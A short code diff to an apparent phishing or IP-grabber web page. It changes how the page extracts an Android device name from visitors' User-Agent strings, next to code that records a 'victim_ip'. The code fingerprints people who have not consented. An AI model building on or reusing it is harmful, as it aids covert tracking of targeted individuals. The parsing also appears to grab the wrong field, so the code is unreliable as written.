@@ -241,10 +241,17 @@ def landpage(username):
             return request.remote_addr
         victim_ip = get_user_ip()
         def get_os_info():
-            try:
-                return request.user_agent.platform
-            except:
-                return "Not available"
+            user_agent_string = request.user_agent.string
+            if 'Android' in user_agent_string:
+        # Assuming device name follows "Build" information
+                start_index = user_agent_string.find('(')
+                end_index = user_agent_string.find(')')
+                if start_index != -1 and end_index != -1:
+                    build_info = user_agent_string[start_index+1:end_index]
+            # Extract device name from build info
+                    device_name = build_info.split(';')[0].strip()
+                    return device_name
+            return None
         os_info = get_os_info()
         if os_info is None:
             os_info = "Unknown"
